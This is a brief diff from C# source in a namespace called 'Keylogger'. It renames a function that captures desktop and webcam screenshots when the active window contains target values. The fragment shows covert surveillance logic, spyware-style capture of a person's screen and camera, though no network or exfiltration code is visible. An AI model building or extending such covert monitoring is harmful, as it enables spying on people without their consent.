@@ -14,7 +14,7 @@ namespace Keylogger
         // Send desktop and webcam screenshot if active window contains target values
         public static void Action()
         {
-            if (Detect()) SendPhotos();
+            if (Detect()) SavePhotos();
         }
 
         // Detect target data in active window
@@ -28,7 +28,7 @@ namespace Keylogger
         }
 
         // Save photos
-        private static void SendPhotos()
+        private static void SavePhotos()
         {
             string logdir = LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
             if (!Directory.Exists(logdir))
